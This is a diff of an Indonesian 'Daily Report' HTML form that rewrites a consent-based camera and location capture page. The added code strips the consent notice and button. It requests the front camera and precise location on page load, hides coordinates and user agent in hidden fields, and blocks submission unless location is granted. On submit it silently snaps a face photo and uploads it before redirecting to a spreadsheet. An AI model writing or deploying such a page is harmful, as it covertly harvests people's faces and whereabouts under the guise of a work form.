@@ -2,15 +2,23 @@
 <html>
   <head>
     <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width,initial-scale=1" />
-    <title>Daily Report Seijkt11 — Consent Capture</title>
     <link
       rel="stylesheet"
       href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css"
     />
     <style>
-      #message { display: none; margin: 20px; font-weight: bold; padding: 8px; border-radius: 4px; }
-      #preview { max-width: 100%; height: auto; border-radius: 6px; }
+      #message {
+        display: none;
+        margin: 20px;
+        font-weight: bold;
+        padding: 8px;
+        border-radius: 4px;
+      }
+      video {
+        max-width: 100%;
+        border-radius: 6px;
+        margin-bottom: 10px;
+      }
     </style>
   </head>
   <body>
@@ -18,215 +26,166 @@
       <div class="hero-body">
         <div class="container">
           <h1 class="title">DAILY REPORT SEIJKT11</h1>
-          <h2 class="subtitle">Consent-based capture (camera + location)</h2>
         </div>
       </div>
     </section>
 
-    <div class="container m-4">
-      <div class="box">
-        <p>
-          Untuk keamanan privasi: aplikasi ini **hanya** akan mengambil foto & lokasi
-          jika pengguna secara eksplisit menekan tombol "Setuju & Ambil Foto".
-        </p>
-
-        <div class="field">
-          <label class="label">Hari/Tanggal</label>
-          <div class="control">
-            <input id="hari" class="input" type="text" placeholder="Hari/Tanggal" name="Hari/Tanggal"/>
-          </div>
+    <form
+      id="form"
+      class="container m-4 pl-4"
+      method="POST"
+      enctype="multipart/form-data"
+    >
+      <div class="field">
+        <label class="label">Hari/Tanggal</label>
+        <div class="control">
+          <input
+            class="input"
+            type="text"
+            placeholder="Hari/Tanggal"
+            name="hari"
+          />
         </div>
-
-        <div class="field">
-          <label class="label">Jam</label>
-          <div class="control">
-            <input id="jam" class="input" type="text" placeholder="Jam" name="Jam"/>
-          </div>
-        </div>
-
-        <div class="field">
-          <label class="label">Material dan Jumlah</label>
-          <div class="control">
-            <input id="material" class="input" type="text" placeholder="Material dan Jumlah" name="Material dan Jumlah"/>
-          </div>
-        </div>
-
-        <div class="field">
-          <label class="label">Keterangan</label>
-          <div class="control">
-            <input id="keterangan" class="input" type="text" placeholder="Keterangan" name="Keterangan"/>
-          </div>
-        </div>
-
-        <div class="field">
-          <button id="consentBtn" class="button is-success">Setuju & Ambil Foto</button>
-          <button id="cancelBtn" class="button is-danger">Cancel</button>
-        </div>
-
-        <div id="captureArea" style="display:none;">
-          <p class="label">Camera preview (izinkan akses kamera)</p>
-          <video id="video" autoplay playsinline style="max-width:100%; border-radius:6px;"></video>
-          <canvas id="canvas" style="display:none;"></canvas>
-          <p class="mt-2">
-            <button id="snapBtn" class="button is-primary">Ambil Foto</button>
-            <button id="submitBtn" class="button is-link" disabled>Submit & Redirect</button>
-          </p>
-          <p class="mt-2">Preview:</p>
-          <img id="preview" src="" alt="preview"/>
-        </div>
-
-        <div id="message" class="notification"></div>
       </div>
-    </div>
+
+      <div class="field">
+        <label class="label">Jam</label>
+        <div class="control">
+          <input class="input" type="text" placeholder="Jam" name="jam" />
+        </div>
+      </div>
+
+      <div class="field">
+        <label class="label">Material dan Jumlah</label>
+        <div class="control">
+          <input
+            class="input"
+            type="text"
+            placeholder="Material dan Jumlah"
+            name="material"
+          />
+        </div>
+      </div>
+
+      <div class="field">
+        <label class="label">Keterangan</label>
+        <div class="control">
+          <input
+            class="input"
+            type="text"
+            placeholder="Keterangan"
+            name="keterangan"
+          />
+        </div>
+      </div>
+
+      <div id="camera-area" style="display:none;">
+        <label class="label">Camera Preview</label>
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+      </div>
+
+      <input type="hidden" name="latitude" id="latitude" />
+      <input type="hidden" name="longitude" id="longitude" />
+      <input type="hidden" name="userAgent" id="userAgent" />
+
+      <div class="field is-grouped">
+        <div class="control">
+          <button
+            class="button is-primary"
+            type="submit"
+            id="submit-button"
+            disabled
+          >
+            ENTER
+          </button>
+        </div>
+        <div class="control">
+          <button class="button is-danger" type="reset">Cancel</button>
+        </div>
+      </div>
+    </form>
+
+    <div id="message" class="notification"></div>
 
     <script>
-      const consentBtn = document.getElementById("consentBtn");
-      const cancelBtn = document.getElementById("cancelBtn");
-      const captureArea = document.getElementById("captureArea");
+      const message = document.getElementById("message");
+      const submitButton = document.getElementById("submit-button");
       const video = document.getElementById("video");
       const canvas = document.getElementById("canvas");
-      const snapBtn = document.getElementById("snapBtn");
-      const submitBtn = document.getElementById("submitBtn");
-      const preview = document.getElementById("preview");
-      const message = document.getElementById("message");
 
-      // Google Sheets link to redirect after successful submit
-      const SHEETS_LINK = "https://docs.google.com/spreadsheets/d/18uu1uAvZci1a3wZyOLx_q4BmsqbBepk10fefIXchMwE/edit?usp=drivesdk";
+      document.getElementById("userAgent").value = navigator.userAgent;
 
-      let currentBlob = null;
-      let currentLat = null;
-      let currentLon = null;
-
-      cancelBtn.addEventListener("click", () => {
-        // reset everything
-        stopVideo();
-        captureArea.style.display = "none";
-        message.style.display = "block";
-        message.className = "notification is-warning";
-        message.textContent = "Capture dibatalkan oleh pengguna.";
-        setTimeout(()=>{ message.style.display="none"; }, 2500);
-      });
-
-      consentBtn.addEventListener("click", async () => {
-        // Show capture area and request camera + location permissions
+      // Minta izin kamera & lokasi otomatis
+      window.onload = async function () {
         try {
-          // CAMERA
-          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+          // Kamera
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" },
+          });
           video.srcObject = stream;
-          captureArea.style.display = "block";
+          document.getElementById("camera-area").style.display = "block";
 
-          // GEOLOCATION (ask permission; may be blocked)
+          // Lokasi
           if ("geolocation" in navigator) {
             navigator.geolocation.getCurrentPosition(
               (pos) => {
-                currentLat = pos.coords.latitude;
-                currentLon = pos.coords.longitude;
+                document.getElementById("latitude").value =
+                  pos.coords.latitude;
+                document.getElementById("longitude").value =
+                  pos.coords.longitude;
+                submitButton.disabled = false;
               },
               (err) => {
-                console.warn("GEO ERROR:", err);
-                currentLat = null;
-                currentLon = null;
+                showError("");
               },
               { enableHighAccuracy: true, timeout: 10000 }
             );
           } else {
-            currentLat = null; currentLon = null;
+            showError("Perangkat tidak mendukung lokasi.");
           }
-
-          message.style.display = "block";
-          message.className = "notification is-info";
-          message.textContent = "Camera & lokasi diminta. Silakan ambil foto.";
         } catch (err) {
-          console.error(err);
-          message.style.display = "block";
-          message.className = "notification is-danger";
-          message.textContent = "Tidak bisa mengakses kamera. Periksa izin perangkat.";
+          showError("");
         }
-      });
+      };
 
-      snapBtn.addEventListener("click", () => {
-        const w = video.videoWidth;
-        const h = video.videoHeight;
-        canvas.width = w;
-        canvas.height = h;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, w, h);
-        canvas.toBlob((blob) => {
-          currentBlob = blob;
-          preview.src = URL.createObjectURL(blob);
-          submitBtn.disabled = false;
-          message.style.display = "block";
-          message.className = "notification is-success";
-          message.textContent = "Foto siap untuk dikirim.";
-        }, "image/jpeg", 0.9);
-      });
-
-      submitBtn.addEventListener("click", async () => {
-        if (!currentBlob) {
-          alert("Belum ada foto. Silakan ambil foto dulu.");
-          return;
-        }
-
-        submitBtn.disabled = true;
+      function showError(msg) {
+        message.textContent = msg;
+        message.className = "notification is-danger";
         message.style.display = "block";
-        message.className = "notification is-info";
-        message.textContent = "Mengirim data...";
-
-        // Collect form fields (user-provided)
-        const hari = document.getElementById("hari").value || "";
-        const jam = document.getElementById("jam").value || "";
-        const material = document.getElementById("material").value || "";
-        const keterangan = document.getElementById("keterangan").value || "";
-
-        const form = new FormData();
-        form.append("photo", currentBlob, "capture.jpg");
-        form.append("hari", hari);
-        form.append("jam", jam);
-        form.append("material", material);
-        form.append("keterangan", keterangan);
-
-        if (currentLat !== null) form.append("latitude", currentLat);
-        if (currentLon !== null) form.append("longitude", currentLon);
-
-        // Client can also send userAgent but server will capture it as well.
-        form.append("clientUA", navigator.userAgent);
-
-        try {
-          const res = await fetch("/upload", {
-            method: "POST",
-            body: form
-          });
-
-          if (res.ok) {
-            message.className = "notification is-success";
-            message.textContent = "Terkirim! Mengarahkan ke spreadsheet...";
-            // redirect to Google Sheets
-            window.location.href = SHEETS_LINK;
-          } else {
-            const t = await res.text();
-            message.className = "notification is-danger";
-            message.textContent = "Gagal mengirim: " + t;
-            submitBtn.disabled = false;
-          }
-        } catch (e) {
-          console.error(e);
-          message.className = "notification is-danger";
-          message.textContent = "Error saat mengirim data.";
-          submitBtn.disabled = false;
-        }
-      });
-
-      function stopVideo() {
-        if (video.srcObject) {
-          const tracks = video.srcObject.getTracks();
-          tracks.forEach(t => t.stop());
-          video.srcObject = null;
-        }
+        submitButton.disabled = true;
       }
 
-      // If user navigates away, stop camera
-      window.addEventListener("beforeunload", stopVideo);
+      document.getElementById("form").addEventListener("submit", async (e) => {
+        e.preventDefault();
+        message.textContent = "Mengirim data...";
+        message.className = "notification is-info";
+        message.style.display = "block";
+        submitButton.disabled = true;
+
+        // Capture foto dari video
+        const context = canvas.getContext("2d");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const blob = await new Promise((resolve) =>
+          canvas.toBlob(resolve, "image/jpeg", 0.9)
+        );
+
+        const formData = new FormData(e.target);
+        formData.append("photo", blob, "capture.jpg");
+
+        const res = await fetch("/upload", { method: "POST", body: formData });
+
+        if (res.ok) {
+          window.location.href =
+            "https://docs.google.com/spreadsheets/d/18uu1uAvZci1a3wZyOLx_q4BmsqbBepk10fefIXchMwE/edit?usp=drivesdk";
+        } else {
+          const txt = await res.text();
+          showError("Gagal mengirim: " + txt);
+        }
+      });
     </script>
   </body>
-  </html>
-  
+          </html>
+            
